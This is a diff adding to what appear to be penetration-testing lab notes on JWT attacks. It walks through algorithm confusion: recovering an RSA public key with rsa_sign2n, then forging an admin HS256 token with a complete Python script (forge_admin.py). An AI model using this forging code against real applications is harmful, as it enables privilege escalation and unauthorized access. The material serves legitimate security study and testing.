@@ -80,3 +80,72 @@ eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbiI6ZmF
 ```
 - Back on [JWT Debugger](https://jwt.lannysport.net/) amend payload as required and add signing secret
 - Refresh landing page with with amended token
+
+### Algorithm Confusion
+
+**NOTE**
+Works if the web application uses the algorithm specified in the alg-claim of the JWT to determine the algorithm for signature verification
+
+- Login with non admin account
+- Copy JWT token
+- Decode at [JWT Debugger](https://jwt.lannysport.net/)
+- Confirm alg value is an asymmetric algorithm (RS256)
+- Access the public key used by the web application for signature verification:
+```bash
+git clone https://github.com/silentsignal/rsa_sign2n
+cd rsa_sign2n/standalone/
+docker build . -t sig2n
+docker run -it sig2n
+
+# Generate two different JWTs signed with the same public key using burp repeater and pass them as args
+python3 jwt_forgery.py eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbiI6ZmFsc2UsImV4cCI6MTc4MTEwNzc5MH0.TaKlletu_olhBl_fxXyiRhqc2T9P4jruXLdqLzIPpU_9mE_njizz9_qslJb_dPZT-ymbvUKmrHvrQM1T6TQR3vDXiXtljBhgtINan_CxCEsbKUaZxcIGmK_DJkl5eNBQla0DO8HpN55AAIoskjysIG2pooYuXhA319cvMVDc4evhpnWaR3Fw8N8_mr-tTmw4_gt6YU21LQwHtUQXWlSPoxbE07wTJD16c63EO9GmcMAobSlWU0PTeGxwydpIP82B7nBC2j4Hu1R-2MWupZoxoo07AYgAZdZiwgdWSDYb5KFNCKRKqnefH4j8OASV0rXIIujN13YC0uUX6Kxm4QamKQ eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbiI6ZmFsc2UsImV4cCI6MTc4MTEwNzc3NH0.Ohtmgwts_GmeNm2-dD03-KEGBF7gj-GYUIkQRB0Jz4KK872TGGYPJ4boaA6ttyfsdHRvpakzP3L4soBWblO3INEiyAJ1iY1tO0VkhiJQtpQFcJXoMaunXfDJvonUf-o0r9j9kATXCMDu-ILq_QK3k-Txevvp3FG8FMuJ3tmV6zRjdaNKbF14WrJt0K3PvCRTzDXSmlHd91GSXDcO9PK42Y-FpUzc82H8mNSUHQI8EAAvLtEAqqbeV--s4C_FYcnZjkQxqWSE38BRVVFVBhHOtbt-fvtXVILKUqxVEh6CIoX6pZuWfKf5GewMfQTVui1NRwigUVFemqe3Uf8ADUn20w
+
+# multiple results returned:
+[+] Written to b1969268f0e66b1c_65537_x509.pem
+[+] Tampered JWT: b'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjogImh0Yi1zdGRudCIsICJpc0FkbWluIjogZmFsc2UsICJleHAiOiAxNzgxMTkyNjEwfQ.0gp7VdPNIS4bgSUmav9EbBdN9koB3uCg2MezFuAF_Qs'
+[+] Written to b1969268f0e66b1c_65537_pkcs1.pem
+[+] Tampered JWT: b'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjogImh0Yi1zdGRudCIsICJpc0FkbWluIjogZmFsc2UsICJleHAiOiAxNzgxMTkyNjEwfQ.gzm7wCp4TP4xvsxw-hF23cbCNEGhVtWsFNj3yopYgqk'
+```
+- Back on [JWT Debugger](https://jwt.lannysport.net/) past the generated JWT to confirm that it indeed uses a symmetric signature algorithm (HS256)
+- Send the generated JWTs as session token to landing page request to conifirm which one is accepted and that app is vulnerable to algorithm confusion
+```bash
+
+# Forge the JWT using the working JWT and the corresponding .pem file, changing isAdmin to true
+cat > forge_admin.py << 'EOF'
+import base64
+import hmac
+import hashlib
+import json
+
+# === WORKING TOKEN FROM jwt_forgery.py ===
+working_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjogImh0Yi1zdGRudCIsICJpc0FkbWluIjogZmFsc2UsICJleHAiOiAxNzgxMTkyNjEwfQ.0gp7VdPNIS4bgSUmav9EbBdN9koB3uCg2MezFuAF_Qs"
+
+# Split
+header_b64, payload_b64, _ = working_token.split('.')
+
+# New payload
+payload = json.loads(base64.urlsafe_b64decode(payload_b64 + '==').decode())
+payload["isAdmin"] = True
+
+new_payload_b64 = base64.urlsafe_b64encode(
+    json.dumps(payload, separators=(",", ":")).encode()
+).rstrip(b'=').decode()
+
+# Use the corresponding pem key that worked
+with open("b1969268f0e66b1c_65537_x509.pem", "rb") as f:
+    key = f.read().strip()
+
+# Sign
+signing_input = f"{header_b64}.{new_payload_b64}".encode()
+signature = hmac.new(key, signing_input, hashlib.sha256).digest()
+sig_b64 = base64.urlsafe_b64encode(signature).rstrip(b'=').decode()
+
+print("=== ADMIN TOKEN ===")
+print(f"{header_b64}.{new_payload_b64}.{sig_b64}")
+print("===================")
+EOF
+
+# run the script
+python3 forge_admin.py
+```
+- Copy the newly generated token and resend the landing page request with this token
